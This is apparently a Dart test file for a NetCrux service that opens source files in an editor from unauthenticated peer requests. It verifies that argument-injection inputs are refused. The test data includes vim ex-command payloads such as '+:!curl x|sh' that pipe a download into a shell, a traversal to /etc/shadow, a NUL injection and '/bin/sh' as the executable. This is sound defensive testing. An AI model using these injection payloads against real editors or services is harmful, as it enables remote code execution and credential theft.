// Copyright 2026 Ferrite Engineering LLC
// SPDX-License-Identifier: Apache-2.0

// The CXP `request_open_source` path is the only place in NetCrux where a
// string the application did not author reaches a process argv. CXP has no
// sender authentication, so `filePath` is whatever any process that can
// reach the listening socket chose to send.
//
// There is no shell in that path: `EditorOpenService` substitutes per argv
// element and hands the list to `Process.run`. The exposure is the editor's
// own option parser. The common presets are `vim +{line} {file}` and
// `emacs +{line} {file}`, and an argv element that starts with `+` is an ex
// command rather than a filename.
//
// MUTATION: deleting the absoluteness check in `openSourceLocation` makes
// every test in the first group red.

import 'dart:io';

import 'package:flutter_test/flutter_test.dart';
import 'package:netcrux/services/remote/cxp/editor_open_service.dart';

void main() {
  /// Records what would have been spawned, and answers success, so a test
  /// that fails to refuse shows up as a recorded invocation rather than as
  /// an exception from a missing binary.
  ({List<String> exes, List<List<String>> args, ProcessRunner runner})
  recorder() {
    final exes = <String>[];
    final args = <List<String>>[];
    return (
      exes: exes,
      args: args,
      runner: (String exe, List<String> a) async {
        exes.add(exe);
        args.add(a);
        return ProcessResult(0, 0, '', '');
      },
    );
  }

  group('a peer cannot put a non-path into an editor argv', () {
    test('refuses an ex command whose second character is a colon', () async {
      // The working payload. A bare `+!…` is inert because a resolver that
      // joins it to a root produces a path; it is the colon in position 1
      // that survives a `file[1] == ":"` drive-letter test unchanged.
      final rec = recorder();
      final service = EditorOpenService(processRunner: rec.runner);
      final result = await service.openSourceLocation(
        commandTemplate: 'vim +{line} {file}',
        filePath: '+:!curl x|sh',
        line: 42,
      );
      expect(result.honored, isFalse);
      expect(rec.exes, isEmpty, reason: 'nothing may be spawned');
      expect(result.reason, contains('absolute'));
    });

    test('refuses a drive letter that is not followed by a separator', () {
      // `Z:+!curl x|sh` passes a `length >= 2 && [1] == ":"` test and is
      // then treated as already-absolute, so it reaches argv verbatim.
      final rec = recorder();
      final service = EditorOpenService(processRunner: rec.runner);
      return service
          .openSourceLocation(
            commandTemplate: 'vim +{line} {file}',
            filePath: 'Z:+!curl x|sh',
            line: 1,
          )
          .then((result) {
            expect(result.honored, isFalse);
            expect(rec.exes, isEmpty);
          });
    });

    test('refuses a relative path that climbs out of the tree', () async {
      final rec = recorder();
      final service = EditorOpenService(processRunner: rec.runner);
      final result = await service.openSourceLocation(
        commandTemplate: 'code -g {file}:{line}',
        filePath: '../../../etc/shadow',
        line: 1,
      );
      expect(result.honored, isFalse);
      expect(rec.exes, isEmpty);
    });

    test('refuses a plain relative path', () async {
      final rec = recorder();
      final service = EditorOpenService(processRunner: rec.runner);
      final result = await service.openSourceLocation(
        commandTemplate: 'code -g {file}:{line}',
        filePath: 'rtl/cpu.v',
        line: 1,
      );
      expect(result.honored, isFalse);
      expect(rec.exes, isEmpty);
    });

    test('refuses an empty path', () async {
      final rec = recorder();
      final service = EditorOpenService(processRunner: rec.runner);
      final result = await service.openSourceLocation(
        commandTemplate: 'code {file}',
        filePath: '',
        line: 1,
      );
      expect(result.honored, isFalse);
      expect(rec.exes, isEmpty);
    });

    test('refuses a path carrying a NUL', () async {
      final rec = recorder();
      final service = EditorOpenService(processRunner: rec.runner);
      final result = await service.openSourceLocation(
        commandTemplate: 'code {file}',
        filePath: '/rtl/cpu.v\u0000-evil',
        line: 1,
      );
      expect(result.honored, isFalse);
      expect(rec.exes, isEmpty);
    });

    test('still opens an absolute POSIX path', () async {
      final rec = recorder();
      final service = EditorOpenService(processRunner: rec.runner);
      final result = await service.openSourceLocation(
        commandTemplate: 'code -g {file}:{line}',
        filePath: '/rtl/cpu.v',
        line: 7,
      );
      expect(result.honored, isTrue);
      expect(rec.exes, ['code']);
      expect(rec.args.single, ['-g', '/rtl/cpu.v:7']);
    });

    test('still opens an absolute Windows path', () async {
      final rec = recorder();
      final service = EditorOpenService(processRunner: rec.runner);
      final result = await service.openSourceLocation(
        commandTemplate: 'code -g {file}:{line}',
        filePath: r'C:\rtl\cpu.v',
        line: 7,
      );
      expect(result.honored, isTrue);
      expect(rec.args.single, ['-g', r'C:\rtl\cpu.v:7']);
    });

    test('still opens a UNC path', () async {
      final rec = recorder();
      final service = EditorOpenService(processRunner: rec.runner);
      final result = await service.openSourceLocation(
        commandTemplate: 'code {file}',
        filePath: r'\\build\rtl\cpu.v',
        line: 7,
      );
      expect(result.honored, isTrue);
    });
  });

  group('a peer value can never land in the executable position', () {
    test('refuses a template that begins with {file}', () async {
      // `substituted.first` becomes the executable. A template of `{file}`
      // is contrived, but the type system does not prevent it and the
      // settings field accepts any string.
      final rec = recorder();
      final service = EditorOpenService(processRunner: rec.runner);
      final result = await service.openSourceLocation(
        commandTemplate: '{file} --line {line}',
        filePath: '/bin/sh',
        line: 1,
      );
      expect(result.honored, isFalse);
      expect(rec.exes, isEmpty, reason: 'the peer chose the executable');
      expect(result.reason, contains('executable'));
    });

    test('refuses a template whose first token embeds {line}', () async {
      final rec = recorder();
      final service = EditorOpenService(processRunner: rec.runner);
      final result = await service.openSourceLocation(
        commandTemplate: 'editor{line} {file}',
        filePath: '/rtl/cpu.v',
        line: 1,
      );
      expect(result.honored, isFalse);
      expect(rec.exes, isEmpty);
    });

    test('a placeholder in a later token is still substituted', () async {
      final rec = recorder();
      final service = EditorOpenService(processRunner: rec.runner);
      final result = await service.openSourceLocation(
        commandTemplate: 'code -g {file}:{line}:{column}',
        filePath: '/rtl/cpu.v',
        line: 3,
        column: 9,
      );
      expect(result.honored, isTrue);
      expect(rec.args.single, ['-g', '/rtl/cpu.v:3:9']);
    });
  });
}
